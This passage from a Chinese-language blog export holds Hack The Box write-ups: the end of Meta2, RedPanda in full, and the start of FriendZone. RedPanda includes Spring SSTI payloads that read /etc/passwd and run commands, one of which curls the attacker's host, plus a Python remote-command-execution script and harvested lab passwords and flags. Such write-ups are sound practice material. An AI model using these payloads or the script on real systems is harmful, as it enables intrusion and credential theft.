encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status blink182 (Passpie) 1g 0:00:00:03 DONE (2022-12-31 14:37) 0.3105g/s 50.93p/s 50.93c/s 50.93C/s ginger..blink182 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. 得到了一个密码 blink182 使用我们的密码去导出 passpie 的密码 jnelson@meta2:~/.passpie$ passpie list ╒════════╤═════════╤════════════╤═══════════╕ │ Name │ Login │ Password │ Comment │ ╞════════╪═════════╪════════════╪═══════════╡ │ ssh │ jnelson │ ******** │ │ ├────────┼─────────┼────────────┼───────────┤ │ ssh │ root │ ******** │ │ ╘════════╧═════════╧════════════╧═══════════╛ jnelson@meta2:~/.passpie$ cd ../ jnelson@meta2:~$ touch pass jnelson@meta2:~$ passpie export pass Passphrase: jnelson@meta2:~$ cat pass credentials: - comment: &#39;&#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39; - comment: &#39;&#39; fullname: jnelson@ssh login: jnelson modified: 2022-06-26 08:58:15.514422 name: ssh password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39; handler: passpie version: 1.0 得到了 root 账户的密码 username = root password = p7qfAZt4_A1xo_0x 去切换到 root 用户 jnelson@meta2:~$ su root Password: root@meta2:/home/jnelson# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 得到了 root 权限 root@meta2:/home/jnelson# cat /root/root.txt 8af8be1e265388ed685c674d029175ca 得到了 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"RedPanda - Hackthebox - 未做提权","slug":"Hackthebox/Easy/Hackthebox-RedPanda","date":"2022-10-24T11:38:36.000Z","updated":"2023-06-13T03:49:39.000Z","comments":true,"path":"2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/","link":"","permalink":"http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/","excerpt":"","text":"Hackthebox - RedPanda靶场信息 靶场类型 信息收集Nmapnmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 09:15 CST Nmap scan report for 10.10.11.170 Host is up (0.41s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Sun, 23 Oct 2022 01:16:00 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;meta author=&quot;wooden_k&quot;&gt; | &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/panda.css&quot; type=&quot;text/css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot; type=&quot;text/css&quot;&gt; | &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;div class=&#39;pande&#39;&gt; | &lt;div class=&#39;ear left&#39;&gt;&lt;/div&gt; | &lt;div class=&#39;ear right&#39;&gt;&lt;/div&gt; | &lt;div class=&#39;whiskers left&#39;&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;/div&gt; | &lt;div class=&#39;whiskers right&#39;&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;/div&gt; | &lt;div class=&#39;face&#39;&gt; | &lt;div class=&#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Sun, 23 Oct 2022 01:16:01 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Sun, 23 Oct 2022 01:16:02 GMT | Connection: close | &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 | Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 |_ Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; |_http-open-proxy: Proxy might be redirecting requests |_http-title: Red Panda Search | Made with Spring Boot 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.92%I=7%D=10/23%Time=635495D0%P=arm-apple-darwin21.5.0% SF:r(GetRequest,690,&quot;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;ch SF:arset=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Sun,\\x2023\\x20Oct SF:\\x202022\\x2001:16:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x2 SF:0html&gt;\\n&lt;html\\x20lang=\\&quot;en\\&quot;\\x20dir=\\&quot;ltr\\&quot;&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\ SF:x20\\x20&lt;meta\\x20charset=\\&quot;utf-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20author=\\&quot;w SF:ooden_k\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;!--Codepen\\x20by\\x20khr2003:\\x20https://co SF:depen\\.io/khr2003/pen/BGZdXw\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;sty SF:lesheet\\&quot;\\x20href=\\&quot;css/panda\\.css\\&quot;\\x20type=\\&quot;text/css\\&quot;&gt;\\n\\x20\\x20\\x2 SF:0\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/main\\.css\\&quot;\\x20type=\\&quot;te SF:xt/css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\ SF:x20with\\x20Spring\\x20Boot&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;body&gt;\\n\\n\\ SF:x20\\x20\\x20\\x20&lt;div\\x20class=&#39;pande&#39;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20 SF:class=&#39;ear\\x20left&#39;&gt;&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;ear\\ SF:x20right&#39;&gt;&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;whiskers\\x20le SF:ft&#39;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;/div&gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20&lt;div\\x20class=&#39;whiskers\\x20right&#39;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x SF:20&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;face&#39;&gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;eye&quot;)%r(HTTPOptions,75,&quot;HTTP/1\\.1\\x202 SF:00\\x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x SF:20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:01\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&quot;)%r(RTSPRequest,24E,&quot;HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20t SF:ext/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x2 SF:0435\\r\\nDate:\\x20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:02\\x20GMT\\r\\nConnec SF:tion:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;html\\x20lang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;tit SF:le&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request&lt;/title&gt;&lt;styl SF:e\\x20type=\\&quot;text/css\\&quot;&gt;body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x SF:20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20 SF:h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size: SF:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{h SF:eight:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h SF:1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/ SF:html&gt;&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=10/23%OT=22%CT=1%CU=40350%PV=Y%DS=2%DC=T%G=Y%TM=635496 OS:14%P=arm-apple-darwin21.5.0)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A OS:)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M53 OS:9ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88 OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4 OS:0%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 537.83 ms 10.10.14.1 2 537.94 ms 10.10.11.170 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.28 seconds Http 挺可爱一小熊猫，还会眨眼睛 在下面有个搜索框，随便搜点东西看看 看着交互界面，确实会去数据库进行交互查询，这种潜意识就觉得可能会有注入 没测试出什么东西，去 fuzz 试试吧 Fuzz lucifiel@MacBookPro  ~  ffuf -u &#39;http://10.10.11.170:8080/FUZZ&#39; -w /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.170:8080/FUZZ :: Wordlist : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ stats [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 619ms] error [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 617ms] search [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 616ms] [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 401ms] :: Progress: [30000/30000] :: Job [1/1] :: 8724 req/sec :: Duration: [0:00:41] :: Errors: 10271 :: 有一个 stats 目录，去看一下 这边发现了一些图片，去尝试读取试试 这里提示确实是有注入的，不过有一说一，这图片确实挺有意思的 不过既然 sql 注入不行，那就试试 ssti 呗，反正可以确定漏洞在于注入了 测试出来了 语法是 *{7*7}，把 ssti 语句中的 $ 替换为 * 即可绕过 漏洞利用我们通过 nmap 的扫描结果可得知，这个网站使用的是 Spring Boot，所以可以确定是一个 java 的程序 所以我们去 ssti 的利用语句里找一下 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false 成功读取到 &#x2F;etc&#x2F;passwd 文件 虽然可以了，但是转换格式还是有点麻烦，所以我又找到了一篇文章 https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)} 直接执行似乎会提示错误，去开一个 http 服务试试 python3 -m http.server 80 然后改一下指令，来请求试试 *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl http://10.10.14.2&quot;)} lucifiel@MacBookPro  ~  python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.170 - - [23/Oct/2022 10:02:07] &quot;GET / HTTP/1.1&quot; 200 - 直接搞个 rce 脚本吧 #!/usr/bin/python3 import requests from cmd import Cmd from bs4 import BeautifulSoup print(&quot;&quot;&quot; __ __ __ ______ __ _______ __ _______ __ | | | | | | / | | | | ____| | | | ____| | | | | | | | | | ,----&#39; | | | |__ | | | |__ | | | | | | | | | | | | | __| | | | __| | | | `----. | `--&#39; | | `----. | | | | | | | |____ | `----. |_______| \\______/ \\______| |__| |__| |__| |_______| |_______| &quot;&quot;&quot;) class RCE(Cmd): prompt = &quot;\\033[1;31m$\\033[1;37m &quot; def decimal(self, args): comando = args decimales = [] for i in comando: decimales.append(str(ord(i))) payload = &quot;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&quot; % decimales[0] for i in decimales[1:]: payload += &quot;.concat(T(java.lang.Character).toString({}))&quot;.format(i) payload += &quot;).getInputStream())}&quot; data = { &quot;name&quot;: payload } requer = requests.post(&quot;http://10.10.11.170:8080/search&quot;, data=data) parser = BeautifulSoup(requer.content, &#39;html.parser&#39;) grepcm = parser.find_all(&quot;h2&quot;)[0].get_text() result = grepcm.replace(&#39;You searched for:&#39;,&#39;&#39;).strip() print(result) def default(self, args): try: self.decimal(args) except: print(&quot;%s: command not found&quot; % (args)) RCE().cmdloop() lucifiel@MacBookPro  ~/Desktop  python3 exploip.py __ __ __ ______ __ _______ __ _______ __ | | | | | | / | | | | ____| | | | ____| | | | | | | | | | ,----&#39; | | | |__ | | | |__ | | | | | | | | | | | | | __| | | | __| | | | `----. | `--&#39; | | `----. | | | | | | | |____ | `----. |_______| \\______/ \\______| |__| |__| |__| |_______| |_______| $ whoami woodenk $ id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) 可以成功执行，但是还是没有 shell 方便，先去看看有没有什么可以拿到 shell 的东西吧 在文件 /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java 中，找到了一段凭证 conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;); username = woodenk password = RedPandazRule lucifiel@MacBookPro  ~/Desktop  ssh woodenk@10.10.11.170 woodenk@10.10.11.170&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 24 Oct 2022 03:15:10 AM UTC System load: 0.02 Usage of /: 80.9% of 4.30GB Memory usage: 41% Swap usage: 0% Processes: 213 Users logged in: 0 IPv4 address for eth0: 10.10.11.170 IPv6 address for eth0: dead:beef::250:56ff:feb9:1c2 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Oct 24 03:14:58 2022 from 10.10.14.11 woodenk@redpanda:~$ whoami&amp;&amp;id woodenk uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk) 成功拿到 user 权限的 shell woodenk@redpanda:~$ cat user.txt a00d4342cd040f667d3dbfee34a49451 成功拿到 user 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"FriendZone - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-FriendZone","date":"2022-09-20T11:38:36.000Z","updated":"2023-06-13T03:44:17.000Z","comments":true,"path":"2022/09/20/Hackthebox/Easy/Hackthebox-FriendZone/","link":"","permalink":"http://www.lucifiel.com/2022/09/20/Hackthebox/Easy/Hackthebox-FriendZone/","excerpt":"","text":"Hackthebox - FriendZone靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.123 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 13:14 CST Nmap scan report for 10.10.10.123 Host is up (0.27s latency). Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.29 (Ubuntu) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_http-title: 404 Not Found 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=9/9%OT=21%CT=1%CU=36793%PV=Y%DS=2%DC=T%G=Y%TM=631ACC10 OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS= OS:A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M5 OS:39ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712 OS:0)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q= OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A% OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y% OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T= OS:40%CD=S) Network Distance: 2 hops Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h00m00s, deviation: 1h43m54s, median: -1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2022-09-09T08:15:47+03:00 | smb2-time: | date: 2022-09-09T05:15:49 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 277.35 ms 10.10.14.1 2 277.61 ms 10.10.10.123 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.57 seconds Http 就一张静态图片，肯定不在这里了 Ftp┌──(root㉿lucifiel)-[~/Desktop] └─# ftp 10.10.10.123 Connected to 10.10.10.123. 220 (vsFTPd 3.0.3) Name (10.10.10.123:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed 本台不允许 ftp 匿名登陆 ┌──(root㉿lucifiel)-[~/Desktop] └─# searchsploit vsftpd 3.0.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploit-DB 也只找到一个远程DDOS的漏洞，没什么实际意义 Samba┌──(root㉿lucifiel)-[~/Desktop] └─# smbmap -H 10.10.10.123 [+] Guest session IP: 10.10.10.123:445 Name: 10.10.10.123 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files Development READ, WRITE FriendZone Samba Server Files IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) ┌──(root㉿lucifiel)-[~/Desktop] └─# smbclient --list 10.10.10.123 -U &quot;&quot; Password for [WORKGROUP\\]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$ IPC IPC Service (FriendZone server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FRIENDZONE ┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -p 445 --script=smb-enum-shares 10.10.10.123 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 09:50 CST Nmap scan report for 10.10.10.123 Host is up (1.2s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.10.123\\Development: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\Development | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\Files: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files /etc/Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\hole | Anonymous access: &lt;none&gt; | Current user access: &lt;none&gt; | \\\\10.10.10.123\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (FriendZone server (Samba, Ubuntu)) | Users: 1 | Max Users: &lt;unlimited&gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\general: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\general | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\print$: | Type: STYPE_DISKTREE | Comment: Printer 